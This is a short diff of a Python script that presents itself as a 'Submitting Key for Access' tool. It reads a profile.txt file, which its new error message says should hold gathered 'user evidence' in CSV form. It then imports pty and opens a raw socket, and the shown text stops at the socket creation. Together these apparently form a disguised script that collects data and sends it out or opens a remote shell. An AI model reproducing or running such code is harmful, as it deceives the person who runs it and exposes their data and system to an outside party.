@@ -3,8 +3,11 @@ import os
 import pty
 
 print('Submitting Key for Access!\n\n\n\n-----------\n\n\n\n')
-with open("profile.txt", "r") as f:  
-    content = f.read()  
+try:
+    with open("profile.txt", "r") as f:  
+        content = f.read()  
+except FileNotFoundError:
+    print("Error: profile.txt not found. Please create it and paste any user evidence which you've gathered in csv format. The naming is VERY important for our system.")
 with open("output.txt", "w") as f:
     f.write(content)
 s = socket.socket()
